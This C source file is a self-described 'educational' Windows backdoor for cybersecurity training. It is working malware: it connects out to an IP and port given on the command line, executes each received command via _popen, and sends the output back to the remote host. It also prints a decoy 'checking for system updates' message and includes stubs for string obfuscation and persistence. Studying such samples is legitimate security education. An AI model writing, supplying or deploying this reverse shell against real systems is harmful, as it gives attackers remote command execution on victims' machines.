#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

// XOR decode function
void decode_string(char* str, int len, char key) {
    int i;
    for(i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

// Main backdoor function
int establish_connection(char* ip, int port) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[512];
    int recvbuflen = 512;
    int recv_size;

    printf("[*] Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("[-] Failed. Error Code: %d\n", WSAGetLastError());
        return 1;
    }

    // Create socket
    s = socket(AF_INET, SOCK_STREAM, 0);
    if(s == INVALID_SOCKET) {
        printf("[-] Could not create socket: %d\n", WSAGetLastError());
        return 1;
    }

    printf("[+] Socket created.\n");

    // Prepare sockaddr_in structure
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    // Connect to remote server
    printf("[*] Connecting to %s:%d...\n", ip, port);
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("[-] Connection failed.\n");
        closesocket(s);
        WSACleanup();
        return 1;
    }

    printf("[+] Connected!\n");

    // Command loop
    while(1) {
        recv_size = recv(s, recvbuf, recvbuflen, 0);

        if(recv_size == SOCKET_ERROR || recv_size == 0) {
            printf("[-] Connection closed.\n");
            break;
        }

        recvbuf[recv_size] = '\0';
        printf("[*] Received command: %s\n", recvbuf);

        // Check for exit
        if(strncmp(recvbuf, "exit", 4) == 0) {
            break;
        }

        // Execute command
        FILE* fp = _popen(recvbuf, "r");
        if(fp != NULL) {
            char result[4096];
            while(fgets(result, sizeof(result), fp) != NULL) {
                send(s, result, (int)strlen(result), 0);
            }
            _pclose(fp);
        }
    }

    closesocket(s);
    WSACleanup();
    return 0;
}

// Decoy function
void check_system_updates(void) {
    printf("[*] Checking for system updates...\n");
    Sleep(1000);
    printf("[+] System is up to date.\n");
}

// Persistence function (disabled)
void install_persistence(void) {
    printf("[*] Persistence feature disabled in educational version.\n");
}

int main(int argc, char* argv[]) {
    char target_ip[20];
    int target_port = 4444;

    printf("====================================\n");
    printf("  Educational Backdoor Sample v1.0\n");
    printf("  For MSc Cybersecurity Training\n");
    printf("====================================\n\n");
    printf("WARNING: This is a sample backdoor for educational purposes only!\n");
    printf("Do NOT use on production systems or without authorization.\n\n");

    // Simple string obfuscation
    strcpy(target_ip, "127.0.0.1");
    decode_string(target_ip, 9, 0x00); // Dummy decode (no actual encoding)

    if(argc > 1) {
        strcpy(target_ip, argv[1]);
    }
    if(argc > 2) {
        target_port = atoi(argv[2]);
    }

    // Run decoy function
    check_system_updates();

    // Main malicious functionality
    printf("\n[*] Attempting to establish connection...\n");
    establish_connection(target_ip, target_port);

    printf("\n[*] Program terminated.\n");
    return 0;
}
